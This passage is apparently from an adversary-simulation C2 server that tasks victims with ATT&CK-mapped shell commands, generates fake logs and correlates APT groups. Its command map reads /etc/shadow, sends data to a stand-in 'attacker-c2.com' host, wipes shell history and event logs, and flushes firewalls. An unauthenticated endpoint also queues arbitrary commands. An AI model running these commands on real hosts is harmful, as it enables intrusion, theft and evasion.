                push_log("security", "critical", "pam",
                         f"Multiple auth failures — brute force from {random.choice(_FAKE_IPS)}",
                         {"attempts": random.randint(5, 30), "window_sec": 60})
            else:
                push_log("security", "info", "auditd",
                         f"Audit: process={random.choice(['cron','systemd','bash'])} uid={random.randint(0,1000)}",
                         {})
        except Exception as e:
            push_log("security", "warn", "auth", f"Security log error: {e}")
        await asyncio.sleep(random.uniform(5, 15))


async def _log_network_events():
    while True:
        try:
            r        = random.random()
            src_ip   = random.choice(_INTERNAL_IPS)
            dst_ip   = random.choice(_FAKE_IPS + _INTERNAL_IPS)
            dst_port = random.choice([22, 80, 443, 4444, 8080, 3389, 1337, 6667, 53, 445])
            proto    = "TCP" if dst_port != 53 else "UDP"
            if dst_port in [4444, 1337, 6667, 8080] and r < 0.4:
                push_log("network", "alert", "netstat",
                         f"Suspicious outbound {proto} {src_ip} -> {dst_ip}:{dst_port}",
                         {"src": src_ip, "dst": dst_ip, "dst_port": dst_port, "proto": proto})
            elif r < 0.3:
                push_log("network", "warn", "netstat",
                         f"New connection {src_ip}:{random.randint(32768,60000)} -> {dst_ip}:{dst_port}",
                         {"src": src_ip, "dst": dst_ip, "dst_port": dst_port})
            elif r < 0.5:
                push_log("network", "info", "netstat",
                         f"DNS query -> {random.choice(_FAKE_IPS)}", {"type": "DNS"})
            else:
                push_log("network", "info", "netstat",
                         f"Port scan: {random.choice(_FAKE_IPS)} scanned {random.randint(10,100)} ports", {})
        except Exception as e:
            push_log("network", "warn", "netstat", f"Network log error: {e}")
        await asyncio.sleep(random.uniform(4, 12))


async def _log_filesystem_events():
    while True:
        try:
            r    = random.random()
            path = random.choice(_FILE_PATHS)
            proc = random.choice(["bash", "python3", "nc", "curl", "wget", "cron", "systemd"])
            uid  = random.choice([0, random.randint(1000, 1100)])
            if "/etc/shadow" in path or "/root/.ssh" in path:
                push_log("filesystem", "critical", "inotify",
                         f"Sensitive file accessed: {path} by {proc} (uid={uid})",
                         {"path": path, "process": proc, "uid": uid, "op": "READ"})
            elif "/tmp/.hidden" in path or r < 0.15:
                push_log("filesystem", "alert", "inotify",
                         f"Hidden file modified: {path} by {proc}",
                         {"path": path, "process": proc, "uid": uid, "op": "WRITE"})
            elif r < 0.35:
                push_log("filesystem", "warn", "inotify",
                         f"Config modified: {path} (uid={uid})",
                         {"path": path, "process": proc, "uid": uid, "op": "WRITE"})
            else:
                push_log("filesystem", "info", "inotify",
                         f"File read: {path} by {proc}",
                         {"path": path, "process": proc, "uid": uid, "op": "READ"})
        except Exception as e:
            push_log("filesystem", "warn", "inotify", f"FS log error: {e}")
        await asyncio.sleep(random.uniform(6, 18))


async def _log_attack_correlation(technique: str, output: str):
    """Emit correlated security events when an ATT&CK technique is executed."""
    attack_logs: Dict[str, List] = {
        "T1003": [
            ("security",   "critical", "lsass",   "LSASS memory read — credential dumping attempt"),
            ("filesystem", "critical", "inotify",  "SAM / shadow database accessed"),
        ],
        "T1082": [
            ("system",   "warn", "auditd", "System enumeration: uname, hostname, id"),
            ("security", "warn", "auditd", "Reconnaissance: /etc/os-release read"),
        ],
        "T1053": [
            ("filesystem", "alert", "inotify", "Crontab modified — new scheduled task"),
            ("security",   "alert", "crond",   "Scheduled task created by non-root"),
        ],
        "T1078": [
            ("security", "critical", "auth",    "Valid account used from external IP"),
            ("network",  "alert",    "netstat", "Authenticated session from malicious IP"),
        ],
        "T1110": [
            ("security", "critical", "pam",     "Brute force: 47 failed attempts in 60s"),
            ("network",  "alert",    "netstat", f"High-freq login attempts from {random.choice(_FAKE_IPS)}"),
        ],
        "T1041": [
            ("network", "critical", "netstat", "Data exfiltration over C2 channel detected"),
            ("network", "alert",    "netstat", "Unusual outbound data volume"),
        ],
    }
    entries = attack_logs.get(technique.upper(), [
        ("security", "alert", "sysmon", f"Attack technique {technique} executed on victim host"),
    ])
    for cat, lvl, src, msg in entries:
        push_log(cat, lvl, src, msg, {"technique": technique, "correlated": True})
        await asyncio.sleep(0.5)


async def _auto_save_navigator_layer(interval_seconds: int = 30):
    while True:
        await asyncio.sleep(interval_seconds)
        try:
            parent = os.path.dirname(NAVIGATOR_LAYER_PATH)
            if parent and os.path.isdir(parent):
                with EXECUTED_LOCK:
                    layer = build_navigator_layer(
                        EXECUTED_TECHNIQUES,
                        layer_name=  "C2 Live Session",
                        description= f"Auto-updated {datetime.utcnow().isoformat()}Z",
                    )
                with open(NAVIGATOR_LAYER_PATH, "w") as f:
                    json.dump(layer, f, indent=2)
                logger.debug(f"Navigator layer auto-saved -> {NAVIGATOR_LAYER_PATH}")
        except Exception as e:
            logger.warning(f"Navigator auto-save failed: {e}")

# =============================================================================
#  AUTH HELPERS
# =============================================================================
def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    to_encode["exp"] = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


async def get_current_user(token: str = Depends(oauth2_scheme)) -> dict:
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return {"username": payload.get("sub"), "role": payload.get("role")}
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")

# =============================================================================
#  ATTACK COMMANDS MAP
# =============================================================================
ATTACK_COMMANDS: Dict[str, str] = {
    "T1003":     "cat /etc/shadow",
    "T1005":     "tar czf /tmp/data.tar.gz /etc/passwd /home/ubuntu",
    "T1007":     "service --status-all",
    "T1012":     "ls -la /etc/",
    "T1016":     "route -n || ip route",
    "T1033":     "whoami",
    "T1041":     "curl -X POST -d @/tmp/staged_data.tar.gz https://attacker-c2.com/exfil",
    "T1046":     "ip addr || ifconfig && netstat -tulnp",
    "T1047":     'wmic /node:TARGET process call create "cmd.exe /c whoami"',
    "T1049":     "netstat -an",
    "T1053":     "echo hacked > /tmp/persist.txt",
    "T1053.001": "ls -la /etc/cron*",
    "T1053.003": "crontab -l",
    "T1057":     "ps aux",
    "T1068":     "find / -perm -4000 2>/dev/null",
    "T1069":     "groups",
    "T1070":     "rm -f /root/.bash_history",
    "T1070.001": "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
    "T1082":     "uname -a && cat /etc/os-release && uptime",
    "T1083":     "ls -R /home",
    "T1087":     "cut -d: -f1 /etc/passwd",
    "T1090":     "curl -s ifconfig.me",
    "T1105":     "wget http://google.com",
    "T1119":     "find /etc /var/www /tmp -type f | head -n 20",
    "T1124":     "date",
    "T1135":     "showmount -e",
    "T1222":     "chmod 777 /etc/passwd",
    "T1505":     "echo 'malicious' >> /var/www/html/index.html",
    "T1518":     "dpkg -l || rpm -qa",
    "T1547":     "echo BOOTED > /tmp/persist_boot.txt",
    "T1548":     "sudo -l",
    "T1552":     "cat /etc/*.conf 2>/dev/null | grep -iE 'pass|key|secret'",
    "T1555":     "cat ~/.bash_history",
    "T1562":     "iptables -F",
    "T1573":     "openssl version",
}

# =============================================================================
#  ROUTES — AUTH
# =============================================================================
@app.post("/token", tags=["auth"])
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    user_data = database.get_user(form_data.username)
    if not user_data:
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    db_username, db_hash, db_role = user_data
    if not database.verify_password(form_data.password, db_hash):
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    token = create_access_token({"sub": db_username, "role": db_role})
    return {"access_token": token, "token_type": "bearer", "role": db_role}

# =============================================================================
#  ROUTES — SYSTEM
# =============================================================================
@app.post("/api/system/start", tags=["system"])
async def start_system(current_user: dict = Depends(get_current_user)):
    return {"status": "Reverse C2 Active"}


@app.post("/api/system/reset", tags=["system"])
async def reset_system(current_user: dict = Depends(get_current_user)):
    TASK_QUEUE.clear()
    OUTPUT_QUEUE.clear()
    with EXECUTED_LOCK:
        EXECUTED_TECHNIQUES.clear()
    with VICTIM_LOCK:
        VICTIM_REGISTRY.clear()
    AGENTS.clear()
    # Re-seed the default victim so the UI is never empty
    register_victim(DEFAULT_VICTIM, label="Default Simulation Victim", source="builtin")
    return {"status": "reset"}

# =============================================================================
#  ROUTES — C2 BEACON  (victim → C2, no auth required)
# =============================================================================
@app.post("/c2/beacon", tags=["c2"])
async def beacon(data: dict):
    """Victim agent polls here for tasks."""
    host = data.get("host")
    if not host:
        raise HTTPException(status_code=400, detail="'host' field required")

    victim_id = normalize_victim_id(host)

    # Auto-register beacon victims in the registry
    register_victim(victim_id, label=host, source="beacon")
    _ensure_victim_queues(victim_id)

    # Update the AGENTS dict (original behaviour preserved)
    AGENTS[victim_id] = {
        "last_seen": str(datetime.utcnow()),
        "original":  host,
    }

    # Also keep the legacy key if host was already stored verbatim elsewhere
    if host != victim_id:
        AGENTS[host] = AGENTS[victim_id]

    task = TASK_QUEUE[victim_id].pop(0) if TASK_QUEUE[victim_id] else None
    return {"task": task}


@app.post("/c2/output", tags=["c2"])
async def receive_output(data: dict):
    """Victim agent posts command output here."""
    host      = data.get("host", "unknown")
    technique = data.get("technique", "CUSTOM")
    output    = data.get("output", "")

    victim_id = normalize_victim_id(host)
    _ensure_victim_queues(victim_id)

    OUTPUT_QUEUE[victim_id].append({
        "technique": technique,
        "output":    output,
        "time":      str(datetime.utcnow()),
    })

    record_executed_technique(technique, output, victim_id)
    asyncio.create_task(_log_attack_correlation(technique, output))

    return {"status": "received"}


@app.post("/c2/custom", tags=["c2"])
async def c2_custom_command(data: dict):
    """
    Victim-side endpoint: queue an arbitrary command via the beacon channel.
    Used internally by the victim agent; does not require auth.
    """
    host    = data.get("host", DEFAULT_VICTIM)
    command = data.get("command")
    if not command:
        raise HTTPException(status_code=400, detail="'command' field required")

    victim_id = normalize_victim_id(host)
    _ensure_victim_queues(victim_id)

    TASK_QUEUE[victim_id].append({"technique": data.get("technique", "CUSTOM"), "command": command})
    logger.info(f"[c2/custom] queued for {victim_id}: {command}")
    return {"status": "queued", "host": victim_id, "command": command}

# =============================================================================
#  ROUTES — AGENTS & OUTPUT
# =============================================================================
@app.get("/api/agents", tags=["agents"])
async def get_agents():
    return AGENTS


@app.get("/api/output/{host}", tags=["agents"])
async def get_output(host: str):
    victim_id = normalize_victim_id(host)
    # Try normalised key first, fall back to raw host (legacy)
    return OUTPUT_QUEUE.get(victim_id) or OUTPUT_QUEUE.get(host, [])

# =============================================================================
#  ROUTES — VICTIM MANAGEMENT  (NEW in v3.1)
# =============================================================================

@app.get("/api/victims", tags=["victims"])
async def list_victims(current_user: dict = Depends(get_current_user)):
    """
    List all known victims — both beacon-registered and manually added.
    Each entry is enriched with live queue/agent state.
    """
    with VICTIM_LOCK:
        victims = list(VICTIM_REGISTRY.values())

    enriched = []
    for v in victims:
        vid = v["victim_id"]
        enriched.append({
            **v,
            "is_beacon_connected": vid in AGENTS,
            "pending_tasks":       len(TASK_QUEUE.get(vid, [])),
            "output_count":        len(OUTPUT_QUEUE.get(vid, [])),
            "agent_last_seen":     AGENTS.get(vid, {}).get("last_seen"),
        })

    return {"count": len(enriched), "victims": enriched}


@app.post("/api/victims/add", tags=["victims"])
async def add_victim(data: dict, current_user: dict = Depends(get_current_user)):
    """
    Manually register a victim by IP address, hostname, or URL.
    Use this for targets that don't run the beacon agent (e.g. scan targets
    for the Kali MCP tools) or to pre-seed targets before an engagement.

    Body fields:
      target  (required) — e.g. "192.168.1.50", "target.lab", "http://10.0.0.5:8080"
      label   (optional) — human-readable name shown in the UI
      tags    (optional) — list of strings for grouping, e.g. ["web","prod"]
      notes   (optional) — free-text notes
    """
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")

    target = data.get("target", "").strip()
    label  = data.get("label", "")
    tags   = data.get("tags", [])
    notes  = data.get("notes", "")

    if not target:
        raise HTTPException(status_code=400, detail="'target' field required")
    if not validate_victim_target(target):
        raise HTTPException(
            status_code=400,
            detail=f"Invalid target format: '{target}'. "
                   "Accepted formats: IPv4 (192.168.1.1), hostname (target.lab), "
                   "or URL (http://192.168.1.1:8080)"
        )

    victim_id = normalize_victim_id(target)
    record    = register_victim(victim_id, label=label or target, source="manual")

    # Persist optional metadata
    with VICTIM_LOCK:
        if tags:
            VICTIM_REGISTRY[victim_id]["tags"] = tags
        if notes:
            VICTIM_REGISTRY[victim_id]["notes"] = notes

    _ensure_victim_queues(victim_id)

    push_log(
        "system", "info", "victim-mgr",
        f"Manual victim added: {victim_id} ({target})",
        {"victim_id": victim_id, "target": target, "label": label},
    )

    return {
        "status":    "added",
        "victim_id": victim_id,
        "target":    target,
        "label":     label or target,
        "tags":      tags,
        "notes":     notes,
    }


@app.patch("/api/victims/{victim_id}", tags=["victims"])
async def update_victim(victim_id: str, data: dict, current_user: dict = Depends(get_current_user)):
    """
    Update metadata for an existing victim.
    Patchable fields: label, tags, notes, active.
    """
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")

    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            raise HTTPException(status_code=404, detail=f"Victim '{victim_id}' not found")
        rec = VICTIM_REGISTRY[victim_id]
        for field in ("label", "tags", "notes", "active"):
            if field in data:
                rec[field] = data[field]

    return {"status": "updated", "victim_id": victim_id, **VICTIM_REGISTRY[victim_id]}


@app.delete("/api/victims/{victim_id}", tags=["victims"])
async def remove_victim(victim_id: str, current_user: dict = Depends(get_current_user)):
    """
    Deactivate a victim — marks it inactive and removes pending tasks.
    Task history and outputs are preserved for audit purposes.
    """
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")
    if victim_id == DEFAULT_VICTIM:
        raise HTTPException(status_code=400, detail="Cannot remove the default simulation victim")

    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            raise HTTPException(status_code=404, detail=f"Victim '{victim_id}' not found")
        VICTIM_REGISTRY[victim_id]["active"] = False

    # Clear pending tasks for this victim (outputs kept)
    TASK_QUEUE.pop(victim_id, None)

    push_log("system", "info", "victim-mgr",
             f"Victim deactivated: {victim_id}",
             {"victim_id": victim_id})

    return {"status": "deactivated", "victim_id": victim_id}


@app.get("/api/victims/{victim_id}/status", tags=["victims"])
async def victim_status(victim_id: str, current_user: dict = Depends(get_current_user)):
    """Full status for a single victim including outputs and executed techniques."""
    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            raise HTTPException(status_code=404, detail=f"Victim '{victim_id}' not found")
        info = dict(VICTIM_REGISTRY[victim_id])

    with EXECUTED_LOCK:
        executed_for_victim = [
            tid for tid, d in EXECUTED_TECHNIQUES.items()
            if victim_id in (d.get("hosts") or set())
        ]

    return {
        **info,
        "is_beacon_connected": victim_id in AGENTS,
        "agent_last_seen":     AGENTS.get(victim_id, {}).get("last_seen"),
        "pending_tasks":       len(TASK_QUEUE.get(victim_id, [])),
        "outputs":             OUTPUT_QUEUE.get(victim_id, []),
        "executed_techniques": sorted(executed_for_victim),
    }


@app.post("/api/victims/{victim_id}/clear-tasks", tags=["victims"])
async def clear_victim_tasks(victim_id: str, current_user: dict = Depends(get_current_user)):
    """Flush the pending task queue for a specific victim without deactivating it."""
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")

    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            raise HTTPException(status_code=404, detail=f"Victim '{victim_id}' not found")

    cleared = len(TASK_QUEUE.get(victim_id, []))
    TASK_QUEUE[victim_id] = []
    return {"status": "cleared", "victim_id": victim_id, "tasks_cleared": cleared}


@app.get("/api/victims/{victim_id}/outputs", tags=["victims"])
async def victim_outputs(
    victim_id: str,
    limit: int = 50,
    current_user: dict = Depends(get_current_user),
):
    """Paginated output history for a specific victim."""
    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            raise HTTPException(status_code=404, detail=f"Victim '{victim_id}' not found")

    outputs = OUTPUT_QUEUE.get(victim_id, [])
    return {
        "victim_id": victim_id,
        "total":     len(outputs),
        "outputs":   outputs[-limit:],
    }

# =============================================================================
#  ROUTES — LIVE LOGS
# =============================================================================
@app.get("/api/logs", tags=["logs"])
async def get_logs(since_id: int = 0, category: str = None, level: str = None, limit: int = 100):
    with LOG_LOCK:
        entries = list(LOG_STORE)
    if category:
        entries = [e for e in entries if e["category"] == category]
    if level:
        entries = [e for e in entries if e["level"] == level]
    entries = [e for e in entries if e["id"] > since_id]
    return {
        "logs":      entries[-limit:],
        "total":     len(LOG_STORE),
        "latest_id": entries[-1]["id"] if entries else since_id,
    }


@app.get("/api/logs/stats", tags=["logs"])
async def get_log_stats():
    with LOG_LOCK:
        entries = list(LOG_STORE)
    stats: Dict[str, Dict] = {}
    for e in entries:
        stats.setdefault(e["category"], {})
        stats[e["category"]][e["level"]] = stats[e["category"]].get(e["level"], 0) + 1
    return {"stats": stats, "total": len(entries)}

# =============================================================================
#  ROUTES — MITRE ATT&CK
# =============================================================================
@app.get("/api/mitre/stats", tags=["mitre"])
async def mitre_statistics():
    if mitre.techniques is None:
        mitre.load_data()
    return mitre.get_statistics()


@app.get("/api/mitre/search/{search_term}", tags=["mitre"])
async def search_mitre(search_term: str):
    if mitre.techniques is None:
        mitre.load_data()
    results = mitre.search_techniques(search_term)
    return {"search_term": search_term, "count": len(results), "results": results}


@app.get("/api/mitre/test/{t_code}", tags=["mitre"])
async def mitre_test(t_code: str):
    if mitre.techniques is None:
        mitre.load_data()
    technique = mitre.get_technique(t_code)
    return {
        "status":            "MITRE data loaded",
        "using_github":      not mitre.using_local_cache,
        "using_local_cache": mitre.using_local_cache,
        "technique_found":   technique is not None,
        "technique_data":    technique,
    }


@app.get("/api/mitre/{t_code}", tags=["mitre"])
async def mitre_lookup(t_code: str):
    if mitre.techniques is None:
        mitre.load_data()
    technique = mitre.get_technique(t_code)
    if not technique:
        raise HTTPException(status_code=404, detail=f"Technique '{t_code}' not found")
    return mitre.format_technique_response(technique, t_code)

# =============================================================================
#  ROUTES — ATTACK
#
#  IMPORTANT: static routes (/supported, /custom) MUST be declared BEFORE the
#  parameterised route (/{t_code}) so FastAPI does not treat them as t_code values.
# =============================================================================
@app.get("/api/attack/supported", tags=["attack"])
async def get_supported_attacks():
    techniques = []
    for code, command in ATTACK_COMMANDS.items():
        mitre_info = mitre.get_technique(code.split(".")[0])
        techniques.append({
            "technique":      code,
            "command":        command,
            "name":           mitre_info.get("name") if mitre_info else "Unknown",
            "has_mitre_info": mitre_info is not None,
        })
    return {"count": len(techniques), "techniques": techniques}


@app.post("/api/attack/custom", tags=["attack"])
async def execute_custom_attack(cmd: dict, current_user: dict = Depends(get_current_user)):
    """
    Operator endpoint: queue an arbitrary shell command on a victim.

    Body fields:
      command  (required) — shell command to queue
      victim   (optional) — IP, hostname, URL, or victim_id; defaults to the
                            default simulation victim
    """
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")

    command    = cmd.get("command", "").strip()
    raw_target = cmd.get("victim", DEFAULT_VICTIM)

    if not command:
        raise HTTPException(status_code=400, detail="'command' field required")

    victim_id = normalize_victim_id(raw_target)

    # Auto-register unknown victims
    if victim_id not in VICTIM_REGISTRY:
        if not validate_victim_target(raw_target):
            raise HTTPException(status_code=400, detail=f"Invalid victim target: '{raw_target}'")
        register_victim(victim_id, label=raw_target, source="auto")

    _ensure_victim_queues(victim_id)
    TASK_QUEUE[victim_id].append({"technique": cmd.get("technique", "CUSTOM"), "command": command})
    logger.info(f"[api/attack/custom] queued for {victim_id}: {command}")

    return {
        "status":    "task queued",
        "technique": "CUSTOM",
        "command":   command,
        "victim":    victim_id,
    }


@app.post("/api/custom", tags=["attack"])
async def run_custom_legacy(cmd: dict, current_user: dict = Depends(get_current_user)):
    """Legacy alias for /api/attack/custom — kept for backwards compatibility."""
    return await execute_custom_attack(cmd, current_user)


@app.post("/api/attack/{t_code}", tags=["attack"])
async def execute_t_code(
    t_code:       str,
    data:         dict = None,
    current_user: dict = Depends(get_current_user),
):
    """
    Queue a known MITRE technique by its ATT&CK ID (e.g. T1082).

    Optionally supply a JSON body with:
      victim  — IP, hostname, URL, or victim_id to target.
                Omit to use the default simulation victim.
    """
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins only")
    if t_code not in ATTACK_COMMANDS:
        raise HTTPException(status_code=404, detail=f"Technique '{t_code}' not supported")

    # ── Resolve victim ──────────────────────────────────────────────────────
    body       = data or {}
    raw_target = body.get("victim", DEFAULT_VICTIM)
    victim_id  = normalize_victim_id(raw_target)

    # Auto-register if not yet known
    if victim_id not in VICTIM_REGISTRY:
        if not validate_victim_target(raw_target):
            raise HTTPException(status_code=400, detail=f"Invalid victim target: '{raw_target}'")
        register_victim(victim_id, label=raw_target, source="auto")

    _ensure_victim_queues(victim_id)
    TASK_QUEUE[victim_id].append({
        "technique": t_code,
        "command":   ATTACK_COMMANDS[t_code],
    })

    push_log(
        "security", "alert", "c2-operator",
        f"Queued {t_code} -> victim {victim_id}",
        {"technique": t_code, "victim": victim_id},
    )

    return {
        "status":    "task queued",
        "technique": t_code,
        "command":   ATTACK_COMMANDS[t_code],
        "victim":    victim_id,
    }

# =============================================================================
#  ROUTES — APT CORRELATION
# =============================================================================
@app.get("/api/apt/correlate", tags=["apt"])
async def correlate_apt_groups(top_n: int = 20):
    if not apt_correlator.loaded:
        if mitre.techniques:
            apt_correlator.load_from_stix(mitre.techniques)
        else:
            raise HTTPException(status_code=503, detail="MITRE data not loaded — call /health first")

    with EXECUTED_LOCK:
        executed_ids = list(EXECUTED_TECHNIQUES.keys())

    if not executed_ids:
        return {
            "executed_count":      0,
            "executed_techniques": [],
            "group_count":         len(apt_correlator.groups),
            "top_matches":         [],
            "message":             "No techniques executed yet. Run some attacks first.",
        }

    matches = apt_correlator.correlate(executed_ids)[:top_n]
    return {
        "executed_count":      len(executed_ids),
        "executed_techniques": sorted(executed_ids),
        "group_count":         len(apt_correlator.groups),
        "top_matches":         [{"rank": i + 1, **m} for i, m in enumerate(matches)],
    }


@app.get("/api/apt/groups", tags=["apt"])
async def list_apt_groups(search: str = None):
    if not apt_correlator.loaded and mitre.techniques:
        apt_correlator.load_from_stix(mitre.techniques)

    with apt_correlator._lock:
        groups = list(apt_correlator.groups.values())

    if search:
        s      = search.lower()
        groups = [
            g for g in groups
            if s in g["name"].lower() or any(s in a.lower() for a in g.get("aliases", []))
        ]

    return {
        "count": len(groups),
        "groups": [
            {
                "name":            g["name"],
                "group_id":        g["group_id"],
                "aliases":         g["aliases"],
                "technique_count": len(g["techniques"]),
                "description":     (g.get("description") or "")[:200],
            }
            for g in sorted(groups, key=lambda x: x["name"])
        ],
    }


@app.get("/api/apt/{group_id}/techniques", tags=["apt"])
async def get_group_techniques(group_id: str):
    if not apt_correlator.loaded and mitre.techniques:
        apt_correlator.load_from_stix(mitre.techniques)

    with apt_correlator._lock:
        group = next(
            (
                g for g in apt_correlator.groups.values()
                if (
                    g["name"].lower() == group_id.lower()
                    or g["group_id"].lower() == group_id.lower()
                    or any(a.lower() == group_id.lower() for a in g.get("aliases", []))
                )
            ),
            None,
        )

    if not group:
        raise HTTPException(status_code=404, detail=f"APT group '{group_id}' not found")

    with EXECUTED_LOCK:
        executed = set(EXECUTED_TECHNIQUES.keys())
    executed |= {t.split(".")[0] for t in executed}

    techniques_detail = []
    for tid in sorted(group["techniques"]):
        mitre_info = mitre.get_technique(tid.split(".")[0])
        name = "Unknown"
        if mitre_info:
            name = mitre_info.get("name") or mitre_info.get("technique_name", "Unknown")
        techniques_detail.append({
            "technique_id": tid,
            "name":         name,
            "executed":     tid in executed,
        })

    executed_overlap = [t for t in techniques_detail if t["executed"]]

    return {
        "name":             group["name"],
        "group_id":         group["group_id"],
        "aliases":          group["aliases"],
        "total_techniques": len(techniques_detail),
        "executed_overlap": len(executed_overlap),
        "coverage_pct":     round(len(executed_overlap) / len(techniques_detail) * 100, 1) if techniques_detail else 0,
        "techniques":       techniques_detail,
    }

# =============================================================================
#  ROUTES — ATT&CK NAVIGATOR
# =============================================================================
@app.get("/api/navigator/layer", tags=["navigator"])
async def get_navigator_layer(
    name:        str = "C2 Simulation — Executed Techniques",
    description: str = "Auto-generated from live C2 session",
):
    with EXECUTED_LOCK:
        snapshot = dict(EXECUTED_TECHNIQUES)
    return build_navigator_layer(snapshot, name, description)


@app.post("/api/navigator/layer/save", tags=["navigator"])
async def save_navigator_layer(data: dict, current_user: dict = Depends(get_current_user)):
    output_path = data.get("output_path", "/tmp/c2_navigator_layer.json")
    name        = data.get("name",        "C2 Simulation — Executed Techniques")
    description = data.get("description", f"Saved at {datetime.utcnow().isoformat()}Z")

    with EXECUTED_LOCK:
        layer = build_navigator_layer(EXECUTED_TECHNIQUES, name, description)

    try:
        parent = os.path.dirname(output_path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(layer, f, indent=2)
        logger.info(f"Navigator layer saved -> {output_path}")
        return {"status": "saved", "path": output_path, "technique_count": len(layer["techniques"])}
    except PermissionError:
        raise HTTPException(status_code=403, detail=f"Cannot write to {output_path}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/navigator/status", tags=["navigator"])
async def navigator_status():
    with EXECUTED_LOCK:
        count  = len(EXECUTED_TECHNIQUES)
        t_list = sorted(EXECUTED_TECHNIQUES.keys())

    return {
        "executed_technique_count": count,
        "executed_techniques":      t_list,
        "apt_groups_loaded":        apt_correlator.loaded,
        "apt_group_count":          len(apt_correlator.groups) if apt_correlator.loaded else 0,
        "layer_ready":              count > 0,
        "auto_save_path":           NAVIGATOR_LAYER_PATH,
        "endpoints": {
            "download_layer":       "GET  /api/navigator/layer",
            "save_layer":           "POST /api/navigator/layer/save",
            "apt_correlate":        "GET  /api/apt/correlate",
            "apt_groups":           "GET  /api/apt/groups",
            "apt_group_techniques": "GET  /api/apt/{group_id}/techniques",
        },
        "quick_start": "curl http://localhost:8000/api/navigator/layer > layer.json",
    }

# =============================================================================
#  ROUTES — AI
# =============================================================================
@app.get("/api/ai/status", tags=["ai"])
async def ai_status():
    healthy = ai.is_available()
    return {
        "configured": healthy,
        "model":      ai.model,
        "backend":    "groq",
        "provider":   "Groq API",
        "api_url":    GROQ_URL,
        "status": (
            f"Groq connected — model '{ai.model}' ready"
            if healthy
            else "Groq API key not configured. Set GROQ_API_KEY environment variable."
        ),
        "environment": {
            "GROQ_MODEL":          ai.model,
            "GROQ_API_KEY_loaded": healthy,
        },
    }


@app.get("/api/ai/test", tags=["ai"])
async def ai_test():
    healthy = await ai.health_check()
    return {
        "status":     f"Groq / {ai.model} ready" if healthy else "Not available — set GROQ_API_KEY",
        "configured": healthy,
        "model":      ai.model,
    }


@app.post("/api/ai/explain", tags=["ai"])
async def explain_attack(data: dict):
    technique_id = data.get("technique", "").upper()
    if not technique_id:
        raise HTTPException(status_code=400, detail="'technique' field required")

    if mitre.techniques is None:
        mitre.load_data()

    mitre_raw  = mitre.get_technique(technique_id.split(".")[0])
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}

    prompt = PROMPT_TEMPLATES["explain_technique"].format(
        technique_id   = technique_id,
        technique_name = mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        tactics        = ", ".join(mitre_data.get("tactics", [])) or "Unknown",
        platforms      = ", ".join(mitre_data.get("platforms", [])) or "Unknown",
        description    = mitre_data.get("description", "No description available"),
    )

    explanation = await ai.generate(prompt, temperature=0.4, max_tokens=512)
    return {
        "technique":      technique_id,
        "technique_name": mitre_data.get("technique_name") or mitre_data.get("name"),
        "model":          ai.model,
        "explanation":    explanation,
        "mitre_context":  mitre_data,
    }


@app.post("/api/ai/explain/stream", tags=["ai"])
async def explain_attack_stream(data: dict):
    technique_id = data.get("technique", "").upper()
    if not technique_id:
        raise HTTPException(status_code=400, detail="'technique' field required")

    if mitre.techniques is None:
        mitre.load_data()

    mitre_raw  = mitre.get_technique(technique_id.split(".")[0])
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}

    prompt = PROMPT_TEMPLATES["explain_technique"].format(
        technique_id   = technique_id,
        technique_name = mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        tactics        = ", ".join(mitre_data.get("tactics", [])) or "Unknown",
        platforms      = ", ".join(mitre_data.get("platforms", [])) or "Unknown",
        description    = mitre_data.get("description", "No description available"),
    )

    return StreamingResponse(
        ai.generate_stream(prompt, temperature=0.4, max_tokens=512),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.post("/api/ai/analyze-output", tags=["ai"])
async def analyze_output_endpoint(data: dict):
    technique_id = data.get("technique", "").upper()
    command      = data.get("command", "N/A")
    output       = data.get("output", "")

    if not output:
        raise HTTPException(status_code=400, detail="'output' field required")

    if mitre.techniques is None:
        mitre.load_data()

    mitre_raw  = mitre.get_technique(technique_id.split(".")[0]) if technique_id else None
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}

    prompt = PROMPT_TEMPLATES["analyze_output"].format(
        technique_id   = technique_id or "Unknown",
        technique_name = mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        command        = command,
        output         = output[:3000],
    )

    analysis = await ai.generate(prompt, temperature=0.3, max_tokens=400)
    return {"technique": technique_id, "model": ai.model, "analysis": analysis}


@app.post("/api/ai/threat-hunt", tags=["ai"])
async def threat_hunt(data: dict):
    techniques = data.get("techniques", [])
    timeframe  = data.get("timeframe", "unknown timeframe")

    if not techniques:
        raise HTTPException(status_code=400, detail="'techniques' list required")

    if mitre.techniques is None:
        mitre.load_data()

    enriched = []
    for t in techniques:
        raw  = mitre.get_technique(t.split(".")[0])
        name = raw.get("name") if raw else "Unknown"
        enriched.append(f"- **{t}**: {name}")

